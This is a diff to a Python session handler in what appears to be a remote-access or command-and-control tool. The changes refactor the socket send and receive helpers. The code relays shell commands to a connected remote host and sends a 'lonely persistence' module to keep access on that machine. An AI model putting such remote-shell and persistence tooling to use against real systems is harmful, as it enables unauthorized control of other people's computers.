@@ -8,9 +8,7 @@
 
 from colorama import Fore,Style
 
-from .other import recvall
 from .other import printColor
-from .other import recvsafe
 from .management import CheckConn
 from .handler import Handler
 from .sql import Sql
@@ -50,8 +48,8 @@ class Session:
                 else:
                     # self.socket.send(shell.encode())
                     print(self.session_nb)
-                    if(CheckConn().safeSend(self.session_nb, self.socket,shell.encode())):
-                        print(recvall(self.socket,4096).decode("utf-8","replace"))
+                    if(CheckConn().sendsafe(self.session_nb, self.socket,shell.encode())):
+                        print(CheckConn().recvall(self.socket,4096).decode("utf-8","replace"))
                     else:
                         printColor("error","\n[-] An error occurred while sending the command.\n")
                         break
@@ -61,10 +59,10 @@ class Session:
     def lonelyPersistence(self):
         #if Handler.dict_conn[self.session_nb][NB_ALIVE]:  #test is life
         mod_persi = "MOD_LONELY_PERSISTENCE:default"
-        if(CheckConn().safeSend(self.session_nb, self.socket, mod_persi.encode())): #send mod persi
+        if(CheckConn().sendsafe(self.session_nb, self.socket, mod_persi.encode())): #send mod persi
             printColor("information","[+] the persistence mod was sent.\n")
             
-            reponse = recvsafe(self.socket,4096).decode("utf-8","replace")
+            reponse = CheckConn().recvsafe(self.socket,4096).decode("utf-8","replace")
 
             if(reponse == "\r\n"):#Mod persi ok  
                 printColor("successfully","[+] the persistence mod is well executed with success..\n")
